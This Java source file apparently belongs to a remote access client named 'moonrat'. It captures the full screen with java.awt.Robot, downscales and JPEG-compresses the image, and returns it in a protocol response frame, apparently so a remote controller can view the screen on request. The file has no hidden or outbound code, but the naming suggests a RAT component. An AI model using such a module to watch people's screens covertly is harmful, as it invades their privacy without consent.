package moonrat.client.tasks;

import java.awt.Graphics2D;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class ScreenTasks {
    private static final int DEFAULT_WIDTH = 1600;
    private static final int DEFAULT_QUALITY = 60;

    private static Robot robot;

    private ScreenTasks() {}

    public static synchronized Frame capture(String width, String quality) {
        Frame response = new Frame(Protocol.SHOT_RESP);
        try {
            int maxWidth = parseInt(width, DEFAULT_WIDTH);
            int compression = Math.max(10, Math.min(100, parseInt(quality, DEFAULT_QUALITY)));

            if (robot == null) robot = new Robot();
            BufferedImage screen = robot.createScreenCapture(
                    new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

            response.fields = new ArrayList<>(List.of(""));
            response.blob = encode(scale(screen, maxWidth), compression);
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure)));
        }
        return response;
    }

    private static BufferedImage scale(BufferedImage source, int maxWidth) {
        if (source.getWidth() <= maxWidth) return source;

        int width = maxWidth;
        int height = Math.max(1, source.getHeight() * maxWidth / source.getWidth());
        BufferedImage target = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
        Graphics2D graphics = target.createGraphics();
        graphics.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
        graphics.drawImage(source, 0, 0, width, height, null);
        graphics.dispose();
        return target;
    }

    private static byte[] encode(BufferedImage image, int quality) throws Exception {
        ImageWriter writer = ImageIO.getImageWritersByFormatName("jpg").next();
        ImageWriteParam parameters = writer.getDefaultWriteParam();
        parameters.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
        parameters.setCompressionQuality(quality / 100f);

        ByteArrayOutputStream buffer = new ByteArrayOutputStream(512 * 1024);
        try (ImageOutputStream output = ImageIO.createImageOutputStream(buffer)) {
            writer.setOutput(output);
            writer.write(null, new IIOImage(image, null, null), parameters);
        }
        writer.dispose();
        return buffer.toByteArray();
    }

    private static int parseInt(String value, int fallback) {
        try {
            return Integer.parseInt(value);
        } catch (Exception failure) {
            return fallback;
        }
    }
}
